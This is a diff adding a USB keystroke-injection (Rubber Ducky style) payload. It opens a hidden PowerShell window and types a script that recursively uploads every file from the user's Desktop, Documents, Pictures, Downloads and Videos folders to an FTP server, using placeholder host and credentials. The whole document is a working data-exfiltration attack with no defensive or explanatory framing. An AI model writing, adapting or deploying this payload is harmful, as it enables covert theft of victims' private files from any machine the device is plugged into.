@@ -1,0 +1,49 @@
+REM Upload folders to FTP server
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+
+REM Set FTP credentials
+STRING $ftpServer = "ftp.example.com"
+ENTER
+STRING $ftpUser = "YOUR_FTP_USERNAME"
+ENTER
+STRING $ftpPass = "YOUR_FTP_PASSWORD"
+ENTER
+
+REM Directories to upload
+STRING $folders = @("Desktop", "Documents", "Pictures", "Downloads", "Videos")
+ENTER
+STRING $userPath = "$env:USERPROFILE"
+ENTER
+
+REM Loop through folders and upload files
+STRING foreach ($folder in $folders) {
+ENTER
+STRING     $fullPath = Join-Path $userPath $folder
+ENTER
+STRING     if (Test-Path $fullPath) {
+ENTER
+STRING         Get-ChildItem -Recurse $fullPath | foreach {
+ENTER
+STRING             if (-not $_.PSIsContainer) {
+ENTER
+STRING                 $webclient = New-Object System.Net.WebClient
+ENTER
+STRING                 $uri = "ftp://$ftpServer/" + $_.Name
+ENTER
+STRING                 $webclient.Credentials = New-Object System.Net.NetworkCredential($ftpUser, $ftpPass)
+ENTER
+STRING                 $webclient.UploadFile($uri, $_.FullName)
+ENTER
+STRING             }
+ENTER
+STRING         }
+ENTER
+STRING     }
+ENTER
+STRING }
+ENTER
